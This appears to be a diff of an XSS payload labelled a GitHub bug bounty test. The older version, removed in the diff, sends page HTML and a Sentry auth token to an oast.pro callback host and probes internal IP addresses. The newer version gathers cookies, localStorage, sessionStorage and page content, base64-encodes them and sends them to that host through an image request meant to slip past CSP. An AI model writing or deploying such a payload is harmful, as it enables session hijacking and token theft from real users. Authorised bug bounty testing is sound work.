@@ -1,15 +1,26 @@
-// Github Bug BOunty Test
-(function() {
-    // 1. Exfiltrate the current page's HTML (reveals internal URLs/tokens)
-    fetch('https://d57482c2ca0c66d951a2g11mcpeyyyyyb.oast.pro/log?data=' + btoa(document.documentElement.innerHTML));
+<script>
+(function(){
+    // GIthub Bug Bounty Test 
+    // 1. Configuration: Your callback listener
+    var callback = "https://d57482c2ca0c66d951a2g11mcpeyyyyyb.oast.pro/log";
 
-    // 2. Attempt to grab the Sentry Auth Token from LocalStorage
-    var token = localStorage.getItem('auth:token');
-    if (token) { fetch('https://d57482c2ca0c66d951a2g11mcpeyyyyyb.oast.pro/token?val=' + token); }
+    // 2. Data Gathering
+    var exfilData = {
+        location: window.location.href,
+        referrer: document.referrer,
+        cookies: document.cookie, // Often empty if HttpOnly is set
+        localStorage: JSON.stringify(localStorage), // Sentry often stores tokens here
+        sessionStorage: JSON.stringify(sessionStorage),
+        dom_preview: document.body.innerText.substring(0, 500), // Preview of the internal page
+        date: new Date().toISOString()
+    };
 
-    // 3. Scan the internal network (using the victim's browser as a proxy)
-    var internalIPs = ['10.0.0.1', '192.168.1.1'];
-    internalIPs.forEach(ip => {
-        fetch('http://' + ip + '/admin').catch(e => console.log('Found internal host!'));
-    });
+    // 3. Encoding to Base64 (Standard for OOB exfiltration)
+    var payload = btoa(unescape(encodeURIComponent(JSON.stringify(exfilData))));
+
+    // 4. Transmission
+    // We use an <img> tag for the callback because it often bypasses strict CSP/CORS
+    var img = new Image();
+    img.src = callback + "?d=" + payload;
 })();
+</script>
